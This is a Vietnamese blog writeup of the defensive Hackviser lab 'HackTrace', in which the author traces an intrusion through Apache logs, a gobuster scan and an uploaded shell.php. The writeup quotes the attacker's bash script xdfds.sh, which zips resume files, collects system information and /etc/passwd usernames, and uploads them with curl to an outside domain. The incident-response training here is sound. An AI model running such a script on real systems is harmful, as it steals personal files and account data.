---
title: '[Writeup] Hackviser Scenarios'
description: "Đây là writeup của các Lab trong Scenarios Hackviser"
tag: ['Writeup', 'Web', 'Hackviser']
top_img: /img/2025/hackviser/logo.png
cover: /img/2025/hackviser/logo.png
category: ['Writeup', 'Hackviser']
date: 2025-08-06 08:56:38
author:
    - d4kw1n
---

# First Say

- Ghi chú lại lời giải của những Lab ở phần Scenarios của nền tảng Hackviser.
- Tháng 8 này phải hard để trong top 5 ^^

# Lab

## HackTrace

### Description

![HackTrace Description](/img/2025/hackviser/hacktrace-des0.png)

![HackTrace Description](/img/2025/hackviser/hacktrace-des.png)

![HackTrace Question](/img/2025/hackviser/hacktrade-ques.png)

### Step

- Đây là một challenge nghiên về Defend, chúng ta sẽ được cung cập quyền truy cập vào server bị tấn công nên chỉ cần tập trung vào việc phân tích các hoạt động tấn công của Hacker.
- Run challenge và "Go to Machine".

1. What is the IP address of the attacker who targeted the website?

- Để trả lời cho câu hỏi này, chúng ta sẽ kiểm tra nội dung của file `/var/log/apache2/access.log` (Đây là file lưu trữ nhật ký truy cập vào web của apache).

```bash
> head /var/log/apache2/access.log
10.0.0.41 - - [03/Feb/2024:08:33:50 -0500] "GET / HTTP/1.1" 200 4050 "-" "gobuster/3.6"
10.0.0.41 - - [03/Feb/2024:08:33:50 -0500] "GET /6e5e4550-fe97-42cd-8ce7-bb952a70f255 HTTP/1.1" 404 432 "-" "gobuster/3.6"
10.0.0.41 - - [03/Feb/2024:08:33:50 -0500] "GET /cgi-bin HTTP/1.1" 404 432 "-" "gobuster/3.6"
10.0.0.41 - - [03/Feb/2024:08:33:50 -0500] "GET /education HTTP/1.1" 404 432 "-" "gobuster/3.6"
10.0.0.41 - - [03/Feb/2024:08:33:50 -0500] "GET /go HTTP/1.1" 404 432 "-" "gobuster/3.6"
10.0.0.41 - - [03/Feb/2024:08:33:50 -0500] "GET /accessibility HTTP/1.1" 404 432 "-" "gobuster/3.6"
10.0.0.41 - - [03/Feb/2024:08:33:50 -0500] "GET /- HTTP/1.1" 404 432 "-" "gobuster/3.6"
10.0.0.41 - - [03/Feb/2024:08:33:50 -0500] "GET /tv HTTP/1.1" 404 432 "-" "gobuster/3.6"
10.0.0.41 - - [03/Feb/2024:08:33:50 -0500] "GET /text HTTP/1.1" 404 432 "-" "gobuster/3.6"
10.0.0.41 - - [03/Feb/2024:08:33:50 -0500] "GET /radio HTTP/1.1" 404 432 "-" "gobuster/3.6"
```

![Access Log](/img/2025/hackviser/access-log-hacktrade.png)

> Answer: 10.0.0.41

2. What tool did the attacker use for directory scanning?

- Dựa vào kết quả của `access.log` thì dễ dàng thấy được attacker đang scan bằng tool `gobuster`

> Answer: gobuster

3. What is the name of the file uploaded by the attacker to the system that allows remote computer access via the web?

![Malicious File Uploaded By Hacker](/img/2025/hackviser/hacktrade-shell.png)

> Answer: shell.php

4. Which function in the software is responsible for the file upload vulnerability?

- Vì lỗ hổng bị khai thác là Upload File nên chỉ cần đọc nội dung file upload.php để tìm đáp án.

![Upload Function](/img/2025/hackviser/hacktrade-upload.png)

> Answer: uploadFile

5. Which important file has the attacker stolen from the system by compressing it into a zip file?

- Ở trong danh sách các file thì có một file lạ có tên là: `xdfds.sh`
- Đọc nội dung file này

```bash
> ls
2023-resumes  fontawesome-5.5  index.php  magnific-popup  upload.php  xdfds.sh
css       img          js     slick       uploads
> cat xdfds.sh
#!/bin/bash


zip -r /tmp/2023-resumes.zip /var/www/html/2023-resumes

curl -F "file=@/tmp/2023-resumes.zip" http://dataprocessingframework.hv/upload

hostname > /tmp/system_info.txt
uname -a >> /tmp/system_info.txt
ifconfig >> /tmp/system_info.txt

curl -F "file=@/tmp/system_info.txt" http://dataprocessingframework.hv/upload

cut -d: -f1 /etc/passwd > /tmp/users.txt
curl -F "file=@/tmp/users.txt" http://dataprocessingframework.hv/upload
> 
```

![Malicios Bash File](/img/2025/hackviser/hacktrade-maliciousbash.png)

> Answer: 2023-resumes.zip

6. Which domain did the attacker use to upload the data they accessed?

- Dựa vào nội dung của file `xdfds.sh` để tìm đáp án

> Answer: dataprocessingframework.hv

